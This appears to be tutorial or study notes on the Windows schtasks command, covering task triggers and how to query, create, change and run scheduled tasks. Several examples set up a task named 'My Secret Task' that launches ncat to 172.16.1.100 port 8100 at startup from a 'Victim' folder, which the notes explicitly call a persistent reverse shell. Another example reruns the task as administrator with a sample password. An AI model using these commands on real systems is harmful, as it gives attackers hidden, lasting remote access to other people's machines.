## **Triggers That Can Start a Scheduled Task**

Scheduled tasks in Windows can be triggered in a variety of ways. These triggers define **when** a task will run:

- **System Event** – When a specific event is logged (e.g., service crash).
    
- **One-Time Schedule** – At a specific time and date.
    
- **Daily** – Runs once every day at a set time.
    
- **Weekly** – Runs on specified days of the week.
    
- **Monthly (By Date)** – Runs on a specific calendar date each month.
    
- **Monthly (By Day-of-Week)** – Runs on something like “second Tuesday.”
    
- **Idle State** – When the computer has been idle for a period of time.
    
- **On Task Registration** – Immediately after the task is created.
    
- **At System Startup** – As soon as the computer boots.
    
- **At User Logon** – When a specific or any user logs in.
    
- **Terminal Server Session Change** – When a user connects, disconnects, or switches sessions.  
    <br/>These triggers give you flexibility for automating tasks under nearly any condition.

## **Using `schtasks` – The Basics**

The `schtasks` command lets you **view, create, and modify** scheduled tasks from the command line. Below are the main operations:

* * *

### **View Existing Scheduled Tasks**

**Syntax Example:**

`SCHTASKS /Query /V /FO LIST`

**Useful Parameters:**

| Parameter | Description |
| --- | --- |
| `/Query` | Lists existing tasks. |
| `/FO` | Output format: `TABLE`, `LIST`, or `CSV`. |
| `/V` | Verbose output: shows all details. |
| `/NH` | Removes the column Headers (for `TABLE` or `CSV`). |
| `/S` | Remote system name or IP (`\\host`). |
| `/U`, `/P` | Credentials for remote system. |

**Sample Output:**

```txt
TaskName:    \Check Network Access
Next Run:    N/A
Status:      Ready
Task To Run: cmd.exe ping 8.8.8.8
Schedule:    At system startup

```

### **Create a New Task**

**At the very least, we need to provide the following parameters:**

- **/create**: to indicate the operation we're performing
    
- **/sc**: to define the schedule
    
- **/tn**: to assign a name
    
- **/tr**: to specify the action to execute
    

**Syntax Example:**

`SCHTASKS /CREATE /SC ONSTART /TN "My Secret Task" /TR "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`

**Key Parameters:**

| Parameter | Description |
| --- | --- |
| `/CREATE` | Tells schtasks to create a new task. |
| `/SC` | Schedule type (e.g., `ONSTART`, `DAILY`, `WEEKLY`). |
| `/TN` | Task name (must be unique). |
| `/TR` | The action to run (script or program). |
| `/RL` | Run level: `LIMITED` or `HIGHEST`. |
| `/Z` | Auto-delete task after it finishes. |
| `/U`, `/P` | (Optional) User credentials to run the task under. |

**Use Case Example:**  
Set up a persistent reverse shell on reboot:

`SCHTASKS /CREATE /SC ONSTART /TN "My Secret Task" /TR "ncat.exe 172.16.1.100 8100"`

* * *

### **Modify an Existing Task**

You can change the action or credentials of an existing task.

**Syntax Example**

`SCHTASKS /CHANGE /TN "My Secret Task" /RU administrator /RP "P@ssw0rd"`

**Other Options:**

| Parameter | Description |
| --- | --- |
| `/TN` | Task name to change. |
| `/TR` | New action to run. |
| `/ENABLE` | Enable the task. |
| `/DISABLE` | Disable the task. |

* * *

## **Verifying Task Changes with `/query`**

After modifying a task (such as changing the user or action it runs), you can **verify** the changes using:

`schtasks /query /tn "My Secret Task" /v /fo list`

This command queries the task by name (`/tn`), enables verbose output (`/v`), and displays it in list format (`/fo list`).

### Sample Output:

```txt
TaskName:         \My Secret Task
Task To Run:      C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Run As User:      SYSTEM
Schedule Type:    At system start up
Scheduled Task State: Enabled

```

## **Testing the Task Immediately**

To test whether a task actually runs successfully (especially after modifications), you can run:

`schtasks /run /tn "My Secret Task"`
